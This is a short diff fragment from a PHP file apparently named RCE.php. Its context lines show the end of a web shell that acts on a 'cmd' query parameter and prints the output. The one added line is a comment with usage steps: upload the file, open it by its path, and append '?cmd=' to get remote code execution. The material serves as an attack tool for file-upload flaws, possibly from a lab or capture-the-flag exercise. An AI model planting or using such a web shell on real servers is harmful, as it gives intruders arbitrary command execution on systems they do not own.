@@ -6,3 +6,4 @@ if(isset($_GET['cmd'])){
     echo "</pre>";
 }
 ?>
+// Upload the file -> access the file through path -> add "?cmd=" after RCE.php 
